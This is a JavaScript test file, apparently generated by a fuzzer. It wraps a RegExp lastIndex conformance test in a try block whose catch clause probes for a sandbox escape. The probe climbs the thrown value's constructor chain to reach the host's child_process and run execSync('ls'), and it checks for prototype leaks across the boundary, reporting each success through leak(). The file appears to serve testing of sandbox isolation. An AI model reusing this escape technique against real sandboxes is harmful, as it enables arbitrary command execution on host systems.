try {
    var lastIndexReads;
    var result;
    var r = /a/g;
    function reset(value) {
        let REPLACER = 23;
        r.lastIndex = {
            valueOf: function () {
                throw () => {
                    return () => {
                    };
                };
                lastIndexReads++;
                return value;
            }
        };
        lastIndexReads = 0;
    }
    reset(42);
    result = r.exec('abc');
    assert.sameValue(result, null);
    assert.sameValue(r.lastIndex, 0);
    assert.sameValue(lastIndexReads, 1);
    reset(-1);
    result = r.exec('nbc');
    assert.sameValue(result, null);
    assert.sameValue(r.lastIndex, 0);
    assert.sameValue(lastIndexReads, 1);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}